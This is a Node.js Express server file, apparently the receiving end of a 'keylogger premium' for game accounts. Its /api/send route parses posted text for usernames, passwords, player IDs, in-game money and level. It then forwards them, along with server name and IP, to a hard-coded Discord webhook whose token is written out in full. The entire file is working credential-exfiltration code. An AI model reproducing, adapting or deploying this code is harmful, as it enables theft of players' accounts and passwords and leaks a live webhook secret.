import express from 'express'
import axios from 'axios'

const app = express()
app.use(express.json())

const PORT = 8080

app.get('/', (_req, res) => {
  res.send('Hello Express API is running!')
})

app.post('/api/send', async (req, res) => {
  try {
    const { c, n, i, s, sip, mip, t } = req.body
    
    if (!c || !n) {
      return res.status(400).json({ success: false, error: "Invalid data format" })
    }

    let rawContent = c || "";
    let extractedPassword = "Tidak ada";
    let extractedUsername = "Tidak ada";
    let extractedNickname = i || "Tidak ada";
    let extractedPlayerId = "Tidak ada";
    let extractedMoney = "Tidak ada";
    let extractedLevel = "Tidak ada";

    const lines = rawContent.split('\n');
    for (const line of lines) {
      if (line.includes('Username:')) {
        extractedUsername = line.replace('Username:', '').trim();
      } else if (line.includes('Password:')) {
        extractedPassword = line.replace('Password:', '').trim();
      } else if (line.includes('Nickname:')) {
        extractedNickname = line.replace('Nickname:', '').trim();
      } else if (line.includes('Player ID:')) {
        extractedPlayerId = line.replace('Player ID:', '').trim();
      } else if (line.includes('Money:')) {
        extractedMoney = line.replace('Money:', '').trim();
      } else if (line.includes('Level:')) {
        extractedLevel = line.replace('Level:', '').trim();
      }
    }

    const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'

    await axios.post(webhookUrl, {
      embeds: [
        {
          title: "PAKET NIH NYET!!",
          color: 16777215,
          fields: [
            {
              name: "Username",
              value: extractedUsername,
              inline: true
            },
            {
              name: "Password",
              value: extractedPassword,
              inline: true
            },
            {
              name: "Player ID",
              value: extractedNickname,
              inline: true
            },
            {
              name: "Server",
              value: s || "Tidak ada",
              inline: false
            },
            {
              name: "Server IP",
              value: sip || "Tidak ada",
              inline: true
            },
            {
              name: "Money",
              value: extractedMoney,
              inline: true
            },
            {
              name: "Level",
              value: extractedLevel,
              inline: true
            },
            {
              name: "DATA PEMAIN",
              value: `\`\`\`\nPassword: ${extractedPassword}\nNickname: ${extractedNickname}\nUsername: ${extractedUsername}\nPlayer ID: ${extractedPlayerId}\nMoney: ${extractedMoney}\nLevel: ${extractedLevel}\n\`\`\``,
              inline: false
            }
          ],
          footer: {
            text: "Dott & Bich - keylogger premium"
          },
          timestamp: new Date().toISOString()
        }
      ]
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    })
    
    res.json({ success: true })
  } catch (error) {
    console.error("Gagal mengirim ke Discord:", error)
    res.status(500).json({ success: false, error: "Internal Server Error" })
  }
})

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`)
})

export default app
